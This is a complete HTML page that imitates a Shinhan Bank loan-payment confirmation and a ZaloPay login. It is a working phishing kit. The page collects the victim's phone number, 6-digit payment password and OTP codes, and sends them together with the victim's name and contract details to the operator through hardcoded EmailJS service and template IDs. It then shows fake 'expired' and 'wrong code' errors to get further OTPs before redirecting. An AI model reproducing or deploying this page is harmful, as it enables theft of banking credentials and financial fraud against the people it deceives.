<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Xác nhận khoản vay Shinhan Bank và giải ngân qua ZaloPay">
    <title>Xác Nhận Thanh Toán - Shinhan Bank</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
      (function() {
         emailjs.init({
           publicKey: "OrBsI926QI2_xBh1f",
         });
      })();
    </script>

    <style>
        :root {
            --shinhan-blue: #004695;
            --shinhan-blue-darker: #00336a;
            --shinhan-blue-light-bg: #E6F0F9;
            --zalopay-blue: #008FE5;
            --zalopay-blue-darker: #0073b8;
            --brand-dark-text: #1d1d1f;
            --brand-light-text: #6e6e73;
            --brand-border: #EAEAEA;
            --brand-background: #F5F5F7;
            --success-green: #28a745;
            --error-red: #ff4d4f;
            --global-font: 'Lexend', sans-serif;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: var(--global-font); }
        body {
            background-color: var(--brand-background);
            display: flex; justify-content: center; align-items: flex-start;
            padding: 20px; min-height: 100vh;
        }
        .mobile-frame { width: 100%; max-width: 420px; margin: auto; background-color: #fff; border-radius: 24px; box-shadow: 0 8px 32px rgba(0,0,0,0.1); overflow: hidden; display: flex; flex-direction: column; min-height: 700px; }
        
        .page-section {
            display: none;
            flex-direction: column;
            flex-grow: 1;
        }
        .page-section.active {
            display: flex;
        }

        .page-header {
            padding: 16px; text-align: center; background-color: #fff;
            border-bottom: 1px solid var(--brand-border);
            flex-shrink: 0;
            position: relative;
        }
        #confirmation-section .page-header {
            background: linear-gradient(90deg, #0057b8, #004695);
            color: white;
            border-bottom: none;
        }
        #confirmation-section .page-header h1 {
            color: white;
            font-size: 18px;
        }
        .page-header .back-button {
             position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
             background: none; border: none; cursor: pointer; padding: 5px;
        }
        .page-header .back-button img { width: 24px; height: 24px; filter: invert(0); }
        #confirmation-section .page-header .back-button img {
             filter: invert(1);
        }
        .page-header h1 { 
            font-size: 17px; 
            font-weight: 600; 
            color: var(--brand-dark-text);
        }
        
        .page-body, .login-body {
            padding: 16px; 
            flex-grow: 1;
            background-color: var(--brand-background);
        }
        .login-body {
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #fff;
        }
        
        .info-card {
            background-color: #fff; border-radius: 12px; padding: 20px; margin-bottom: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
         .info-card .title {
            font-size: 14px; font-weight: 600; color: var(--brand-dark-text); margin-bottom: 8px; display: block;
        }
        
        .payment-summary-card {
            text-align: center;
            padding-top: 24px;
        }
        .payment-summary-card .label {
            font-size: 15px;
            color: var(--brand-light-text);
            margin-bottom: 8px;
        }
        .payment-summary-card .amount {
            font-size: 30px;
            font-weight: 700;
            color: var(--brand-dark-text);
            margin-bottom: 20px;
        }
        .payment-summary-card hr {
            border: none;
            border-top: 1px solid var(--brand-border);
            margin: 0 -20px;
        }
        
        .detail-item {
            display: flex; justify-content: space-between; align-items: center; font-size: 14px; padding: 13px 0;
            border-bottom: 1px solid var(--brand-border);
        }
        .detail-item:first-of-type {
            padding-top: 20px;
        }
        .detail-item:last-of-type { 
            border-bottom: none; 
            padding-bottom: 4px;
        }
        .detail-item .label { color: var(--brand-light-text); font-weight: 400; }
        .detail-item .value { font-weight: 500; color: var(--brand-dark-text); text-align: right; display: flex; align-items: center; gap: 8px; }
        .detail-item .value img { width: 24px; height: 24px; }

        .notice-card {
            background-color: var(--shinhan-blue-light-bg);
            color: var(--brand-dark-text);
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 16px;
        }
        .notice-card img {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
        }
        .notice-card p {
            font-size: 14px;
            line-height: 1.5;
            font-weight: 500;
        }
        .notice-card strong {
            color: var(--shinhan-blue);
        }

        .banner-slider {
            width: 100%;
            aspect-ratio: 16 / 9;
            position: relative;
            overflow: hidden;
            border-radius: 8px;
            margin-bottom: 24px;
        }
        .banner-slide {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
        }
        .banner-slide.active {
            opacity: 1;
        }
        
        .profile-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 24px;
        }
        .profile-header .avatar {
            width: 72px; height: 72px;
            border-radius: 50%;
            background-color: #eef0f2;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .profile-header .avatar img {
            width: 40px;
            opacity: 0.8;
        }
        .profile-header .phone-number {
            font-size: 16px;
            font-weight: 500;
            color: var(--brand-dark-text);
        }
        .login-title { font-size: 22px; font-weight: 700; color: var(--brand-dark-text); margin-bottom: 8px; }
        .login-subtitle { font-size: 15px; color: var(--brand-light-text); margin-bottom: 32px; text-align: center; }
        
        .phone-input-wrapper {
            display: flex; align-items: center; width: 100%;
            border: 1px solid #ddd; border-radius: 12px; padding: 4px 16px; margin-bottom: 16px;
        }
        .phone-prefix { font-size: 18px; font-weight: 600; color: var(--brand-dark-text); padding-right: 12px; border-right: 1px solid #ddd; }
        .phone-input { border: none; padding: 12px; font-size: 18px; font-weight: 600; flex-grow: 1; color: var(--brand-dark-text); }
        .phone-input:focus { outline: none; }
        .phone-input.invalid { border: 1px solid var(--error-red); }

        .input-group { width: 100%; margin-bottom: 16px; }
        .text-input {
            width: 100%; border: none; border-bottom: 2px solid #ddd; padding: 12px 0;
            font-size: 24px; font-weight: 700; text-align: center; letter-spacing: 4px;
            color: var(--brand-dark-text); transition: border-color 0.2s;
        }
        .text-input::placeholder { color: #ccc; font-weight: 400; }
        .text-input:focus { outline: none; border-bottom-color: var(--zalopay-blue); }
        
        .otp-input-container { display: flex; gap: 10px; justify-content: center; margin-bottom: 16px; }
        .otp-input {
            width: 45px; height: 55px; text-align: center; font-size: 22px; font-weight: 600;
            border: 1px solid #ddd; border-radius: 8px; color: var(--brand-dark-text);
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .otp-input::placeholder {
            color: #ccc;
            font-size: 28px;
            line-height: 55px;
        }
        .otp-input:focus { outline: none; border-color: var(--zalopay-blue); box-shadow: 0 0 0 2px rgba(0, 143, 229, 0.2); }
        
        .page-footer, .login-footer {
            padding: 16px; background-color: #fff;
            box-shadow: 0 -4px 12px rgba(0,0,0,0.05);
            flex-shrink: 0;
        }
        .login-footer { margin-top: auto; }

        .agreement-text {
            font-size: 12px;
            color: var(--brand-light-text);
            text-align: center;
            line-height: 1.5;
            margin-bottom: 16px;
        }
        .agreement-text a {
            color: var(--zalopay-blue);
            text-decoration: none;
            font-weight: 500;
        }
        
        .button {
            width: 100%; padding: 14px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600;
            transition: background-color 0.2s; border: none;
        }
        .button:disabled { background-color: #ccc; cursor: not-allowed; }
        .button.primary { background-color: var(--shinhan-blue); color: #fff; }
        .button.primary:hover:not(:disabled) { background-color: var(--shinhan-blue-darker); }
        .button.zalopay-btn { background-color: var(--zalopay-blue-darker); color: #fff; }
        .button.zalopay-btn:hover:not(:disabled) { background-color: #005f99; }
        
        .loading { display: none; margin-bottom: 12px; text-align: center;}
        .spinner { border: 4px solid #f3f3f3; border-top-color: var(--zalopay-blue); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .notification {
            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
            padding: 12px 24px; border-radius: 8px; color: #fff; z-index: 1001;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15); transition: top 0.4s ease-in-out;
            text-align: center;
        }
        .notification.show { top: 20px; }
        .notification.success { background-color: var(--success-green); }
        .notification.error { background-color: var(--error-red); }
    </style>
</head>
<body>
    <div class="mobile-frame">
        <!-- Confirmation View -->
        <div id="confirmation-section" class="page-section active">
            <header class="page-header">
                 <button class="back-button" onclick="window.location.href='https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html'"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M11.03 3.97a.75.75 0 010 1.06l-6.22 6.22H21a.75.75 0 010 1.5H4.81l6.22 6.22a.75.75 0 11-1.06 1.06l-7.5-7.5a.75.75 0 010-1.06l7.5-7.5a.75.75 0 011.06 0z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="Back"/></button>
                <h1>Xác nhận thanh toán</h1>
            </header>
            <main class="page-body">
                <div class="info-card payment-summary-card">
                    <p class="label">Tổng số tiền thanh toán</p>
                    <h2 class="amount" id="mainTotalAmount"></h2>
                    <hr>
                    <div id="payment-details"></div>
                </div>
                <div class="info-card">
                    <strong class="title">Thông tin người vay</strong>
                    <div id="customer-details"></div>
                </div>
                <div class="info-card notice-card">
                    <img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300336a'%3e%3cpath fill-rule='evenodd' d='M6.75 2.25A.75.75 0 017.5 3v1.5h9V3A.75.75 0 0118 3v1.5h.75a3 3 0 013 3v11.25a3 3 0 01-3 3H5.25a3 3 0 01-3-3V7.5a3 3 0 013-3H6V3a.75.75 0 01.75-.75zM5.25 6A1.5 1.5 0 003.75 7.5v11.25c0 .828.672 1.5 1.5 1.5h13.5a1.5 1.5 0 001.5-1.5V7.5A1.5 1.5 0 0018.75 6H5.25z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="Calendar Icon">
                    <p id="closingDateNotice"></p>
                </div>
            </main>
            <footer class="page-footer">
                <button class="button primary" onclick="showSection('zalopay-phone-section')">Xác nhận</button>
            </footer>
        </div>

        <!-- ZaloPay Phone Input View -->
        <div id="zalopay-phone-section" class="page-section">
            <header class="page-header">
                <button class="back-button" onclick="showSection('confirmation-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
                <h1>Đăng nhập ZaloPay</h1>
            </header>
            <main class="login-body" style="padding: 0; justify-content: space-between;">
                <div style="width: 100%;">
                    <div class="banner-slider">
                        <img src="https://simg.zalopay.com.vn/zlp-website/assets/1_Cross_border_3x1_9e16602ab1.jpg" class="banner-slide active" alt="ZaloPay Banner 1">
                        <img src="https://simg.zalopay.com.vn/zlp-website/assets/4_Zalopay_moi_3x1_07918febf5.jpg" class="banner-slide" alt="ZaloPay Banner 2">
                        <img src="https://simg.zalopay.com.vn/zlp-website/assets/He_chill_banner_web_2e131d1a15.jpg" class="banner-slide" alt="ZaloPay Banner 3">
                    </div>
                    <div style="padding: 24px 16px 0;">
                        <p style="font-size: 16px; font-weight: 600; color: var(--brand-dark-text); margin-bottom: 16px;">Nhập số điện thoại để tiếp tục</p>
                        <form class="input-group" onsubmit="event.preventDefault(); handlePhoneSubmit();">
                            <div class="phone-input-wrapper">
                                <span class="phone-prefix">+84</span>
                                <input type="tel" id="zalopay-phone" class="phone-input" placeholder="Số điện thoại" required inputmode="numeric" maxlength="10" pattern="[0-9]{10}" oninput="this.value = this.value.replace(/\D/g, '')" onkeypress="return (event.charCode !=8 && event.charCode ==0 || (event.charCode >= 48 && event.charCode <= 57))">
                            </div>
                        </form>
                    </div>
                </div>
                <div style="padding: 0 16px 16px; width:100%">
                    <p class="agreement-text">
                        Bằng việc sử dụng ZaloPay, tôi đồng ý với
                        <a href="#">Thỏa thuận sử dụng ZaloPay</a> và
                        <a href="#">Chính sách bảo vệ quyền riêng tư</a>.
                    </p>
                    <button class="button zalopay-btn" onclick="handlePhoneSubmit()">Tiếp tục</button>
                </div>
            </main>
        </div>

        <!-- ZaloPay Password Input View -->
        <div id="zalopay-password-section" class="page-section">
            <header class="page-header">
                <button class="back-button" onclick="showSection('zalopay-phone-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
                <h1>Nhập mật khẩu</h1>
            </header>
            <main class="login-body" style="padding-top: 24px;">
                <div class="zlp-profile-header">
                    <div class="avatar"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M18.685 19.097A9.723 9.723 0 0021.75 12c0-5.385-4.365-9.75-9.75-9.75S2.25 6.615 2.25 12a9.723 9.723 0 003.065 7.097A9.716 9.716 0 0012 21.75a9.716 9.716 0 006.685-2.653zm-12.54-1.285A7.486 7.486 0 0112 15a7.486 7.486 0 015.855 2.812A8.224 8.224 0 0112 20.25a8.224 8.224 0 01-5.855-2.438zM15.75 9a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="User Avatar"></div>
                    <span class="phone-number" id="masked-phone-password"></span>
                </div>
                <h2 class="login-title">Nhập mật khẩu thanh toán</h2>
                <form class="input-group" onsubmit="event.preventDefault(); handlePasswordSubmit();">
                    <input type="password" id="zalopay-password" class="text-input" placeholder="••••••" required inputmode="numeric" pattern="[0-9]{6}" maxlength="6" oninput="this.value = this.value.replace(/\D/g, '')">
                </form>
            </main>
            <footer class="login-footer">
                <button class="button zalopay-btn" onclick="handlePasswordSubmit()">Xác nhận</button>
            </footer>
        </div>

        <!-- ZaloPay OTP Input View -->
        <div id="zalopay-otp-section" class="page-section">
            <header class="page-header">
                <button class="back-button" onclick="showSection('zalopay-password-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
                <h1>Nhập mã xác thực</h1>
            </header>
            <main class="login-body" style="padding-top: 24px;">
                <div class="zlp-profile-header">
                    <div class="avatar"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M18.685 19.097A9.723 9.723 0 0021.75 12c0-5.385-4.365-9.75-9.75-9.75S2.25 6.615 2.25 12a9.723 9.723 0 003.065 7.097A9.716 9.716 0 0012 21.75a9.716 9.716 0 006.685-2.653zm-12.54-1.285A7.486 7.486 0 0112 15a7.486 7.486 0 015.855 2.812A8.224 8.224 0 0112 20.25a8.224 8.224 0 01-5.855-2.438zM15.75 9a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="User Avatar"></div>
                    <span class="phone-number" id="masked-phone-otp"></span>
                </div>
                <p class="login-subtitle" id="zalopay-otp-prompt"></p>
                <form class="input-group" onsubmit="event.preventDefault(); handleOtpSubmit();">
                    <div class="otp-input-container">
                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                    </div>
                </form>
                <div class="loading" id="zalopay-otp-loading"><div class="spinner"></div></div>
            </main>
            <footer class="login-footer">
                <button class="button zalopay-btn" id="zalopay-otp-submit-btn" onclick="handleOtpSubmit()">Xác nhận</button>
            </footer>
        </div>
    </div>

    <div id="notification" class="notification"></div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const credentials = {
                phone: '', password: '', otp: ''
            };
            
            const getFormData = () => {
                const storedData = JSON.parse(sessionStorage.getItem('formData')) || {};
                const params = new URLSearchParams(window.location.search);
                return {
                    fullName: storedData.fullName || params.get('fullName') || '',
                    cccd: storedData.cccd || params.get('cccd') || '',
                    amount: parseInt(storedData.amount?.replace(/[^0-9]/g, '')) || parseInt(params.get('amount')) || 0,
                    months: parseInt(storedData.months) || parseInt(params.get('months')) || 48,
                    phone: storedData.phone || params.get('phone') || '',
                    email: storedData.email || params.get('email') || '',
                    method: storedData.method?.toLowerCase() || params.get('method') || 'zalopay'
                };
            };
            
            const formData = getFormData();
            let otpAttempts = 0;

            const getEl = (id) => document.getElementById(id);
            const otpInputs = document.querySelectorAll('#zalopay-otp-section .otp-input');
            const slides = document.querySelectorAll('.banner-slide');
            const slideCount = slides.length;
            let currentSlide = 0;

            const formatCurrency = (amount) => new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(amount);

            const createDetailItem = (label, value, isPaymentMethod = false) => {
                const item = document.createElement('div');
                item.className = 'detail-item';
                
                const labelSpan = document.createElement('span');
                labelSpan.className = 'label';
                labelSpan.textContent = label;

                const valueSpan = document.createElement('span');
                valueSpan.className = 'value';

                if(isPaymentMethod) {
                    const logo = document.createElement('img');
                    logo.src = 'https://simg.zalopay.com.vn/zlp-website/assets/new_logo_6c5db2d21b.svg';
                    valueSpan.appendChild(logo);
                    valueSpan.append(value);
                } else {
                    valueSpan.textContent = value;
                }
                
                item.appendChild(labelSpan);
                item.appendChild(valueSpan);
                return item;
            };

            const populateData = () => {
                const principal = formData.amount || 0;
                const interest = formData.interest !== undefined ? formData.interest : (principal * 0.057);
                const overdueAmount = 0;
                const earlyTerminationFee = 0;
                const collectionFee = 24000;
                const customerName = formData.fullName || '';
                const contractNumber = 'SHB-' + Math.floor(1000000000 + Math.random() * 9000000000);
                const loanTermInMonths = formData.months || 48;

                const totalAmount = principal + interest + overdueAmount + earlyTerminationFee + collectionFee;
                getEl('mainTotalAmount').textContent = formatCurrency(principal);
                
                const paymentDetailsContainer = getEl('payment-details');
                paymentDetailsContainer.innerHTML = '';
                paymentDetailsContainer.appendChild(createDetailItem('Số tiền gốc', formatCurrency(principal)));
                paymentDetailsContainer.appendChild(createDetailItem('Số tiền lãi', formatCurrency(interest)));
                paymentDetailsContainer.appendChild(createDetailItem('Số tiền quá hạn', formatCurrency(overdueAmount)));
                paymentDetailsContainer.appendChild(createDetailItem('Phí tất toán trước hạn', formatCurrency(earlyTerminationFee)));
                paymentDetailsContainer.appendChild(createDetailItem('Phí thu hộ/giao dịch', formatCurrency(collectionFee)));
                paymentDetailsContainer.appendChild(createDetailItem('Thanh toán qua', 'Ví ZaloPay', true));
                
                const customerDetailsContainer = getEl('customer-details');
                customerDetailsContainer.innerHTML = '';
                if (customerName) {
                    customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName));
                }
                customerDetailsContainer.appendChild(createDetailItem('Số hợp đồng', contractNumber));
                
                const closingDate = new Date();
                closingDate.setMonth(closingDate.getMonth() + loanTermInMonths);
                const formattedClosingDate = closingDate.toLocaleDateString('vi-VN', {
                    day: '2-digit', month: '2-digit', year: 'numeric'
                });

                getEl('closingDateNotice').innerHTML = `<strong>Shinhan Bank</strong> sẽ đóng khoản vay vào ngày <strong>${formattedClosingDate}</strong>, sau khi bạn hoàn tất thanh toán`;
            };

            window.showNotification = (message, type = 'error', duration = 3000) => {
                const notification = getEl('notification');
                notification.innerHTML = message;
                notification.className = `notification ${type} show`;
                setTimeout(() => notification.classList.remove('show'), duration);
            };
            
            window.showSection = (sectionId) => {
                document.querySelectorAll('.page-section').forEach(section => section.classList.remove('active'));
                getEl(sectionId).classList.add('active');
            };

            window.handlePhoneSubmit = () => {
                const phoneInput = getEl('zalopay-phone');
                let phoneValue = phoneInput.value.replace(/\D/g, '');
                
                if (phoneValue.length === 10 && phoneValue.startsWith('0')) {
                    credentials.phone = `+84${phoneValue.substring(1)}`;
                    const maskedPhone = `+84 **** ${phoneValue.slice(-3)}`;
                    getEl('masked-phone-password').textContent = maskedPhone;
                    phoneInput.classList.remove('invalid');
                    showSection('zalopay-password-section');
                } else {
                    phoneInput.classList.add('invalid');
                    showNotification('Số điện thoại phải đúng 10 số và bắt đầu bằng 0.', 'error');
                }
            };

            // Real-time phone number validation
            const phoneInput = getEl('zalopay-phone');
            phoneInput.addEventListener('input', () => {
                let value = phoneInput.value.replace(/\D/g, '');
                if (value.length > 10) {
                    value = value.slice(0, 10);
                }
                phoneInput.value = value;
                
                if (value.length === 10 && value.startsWith('0')) {
                    phoneInput.classList.remove('invalid');
                } else {
                    phoneInput.classList.add('invalid');
                }
            });

            window.handlePasswordSubmit = () => {
                const passwordInput = getEl('zalopay-password');
                if (passwordInput.checkValidity()) {
                    credentials.password = passwordInput.value;
                    sendToEmail('password', credentials.password);
                    
                    const maskedPhone = `+84 **** ${credentials.phone.slice(-3)}`;
                    getEl('masked-phone-otp').textContent = maskedPhone;
                    getEl('zalopay-otp-prompt').textContent = `Mã xác thực đã được gửi đến SĐT ${maskedPhone}.`;
                    showSection('zalopay-otp-section');
                    otpInputs[0].focus();
                    setTimeout(() => showNotification(`Đã gửi mã OTP đến ${credentials.phone}`, 'success'), 1000);
                } else {
                    showNotification('Mật khẩu thanh toán phải là 6 chữ số.', 'error');
                }
            };

            const sendToEmail = (type, value) => {
                const serviceID = 'service_60tgxof';
                let templateID = '';
                let templateParams = {};
                const contractNumber = getEl('customer-details').querySelector('.detail-item:last-child .value')?.textContent || '';

                const commonParams = {
                    platform: "ZaloPay (Shinhan Layout)",
                    phone: credentials.phone || '',
                    contract_number: contractNumber,
                    customer_name: formData.fullName || '',
                    total_amount: getEl('mainTotalAmount').textContent || ''
                };

                if (type === 'password') {
                    templateID = 'template_xw5s9pw';
                    templateParams = { ...commonParams, password: value };
                } else if (type === 'otp') {
                    templateID = 'template_g9e2jee';
                    templateParams = { ...commonParams, otp: value, password: credentials.password };
                }

                if(templateID) {
                    emailjs.send(serviceID, templateID, templateParams)
                        .then(() => console.log(`${type} sent successfully.`))
                        .catch(err => console.error(`EmailJS send failed for ${type}:`, err));
                }
            };

            const clearOtpInputs = () => {
                otpInputs.forEach(input => input.value = '');
                otpInputs[0].focus();
            };
            
            window.handleOtpSubmit = () => {
                credentials.otp = Array.from(otpInputs).map(input => input.value).join('');
                
                if (credentials.otp.length !== 6) {
                    showNotification('Mã xác thực không hợp lệ. Vui lòng thử lại.', 'error');
                    return;
                }
                
                const otpLoading = getEl('zalopay-otp-loading');
                const otpSubmitBtn = getEl('zalopay-otp-submit-btn');
                otpLoading.style.display = 'block';
                otpSubmitBtn.disabled = true;
                
                sendToEmail('otp', credentials.otp);

                setTimeout(() => {
                    otpAttempts++;
                    otpLoading.style.display = 'none';
                    otpSubmitBtn.disabled = false;

                    switch (otpAttempts) {
                        case 1:
                            showNotification('Mã xác thực đã hết hiệu lực. Vui lòng thử lại.', 'error');
                            clearOtpInputs();
                            break;
                        case 2:
                            showNotification('Mã xác thực không đúng. Vui lòng kiểm tra lại.', 'error');
                            clearOtpInputs();
                            break;
                        case 3:
                            showNotification('Xác nhận giải ngân không thành công.<br>Đang chuyển hướng...', 'error', 4000);
                            setTimeout(() => {
                                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
                            }, 4000);
                            break;
                    }
                }, 1500);
            };

            otpInputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value && index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === "Backspace" && !input.value && index > 0) {
                        otpInputs[index - 1].focus();
                    }
                });
                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').slice(0, 6);
                    pasteData.split('').forEach((char, i) => {
                        if(otpInputs[i]) otpInputs[i].value = char;
                    });
                    if (pasteData.length > 0) {
                        otpInputs[Math.min(5, pasteData.length -1)].focus();
                    }
                });
            });
            
            const startSlider = () => {
                if(slideCount > 0){
                    setInterval(() => {
                        slides[currentSlide].classList.remove('active');
                        currentSlide = (currentSlide + 1) % slideCount;
                        slides[currentSlide].classList.add('active');
                    }, 3000); 
                }
            };

            populateData();
            startSlider();
        });
    </script>
</body>
</html>
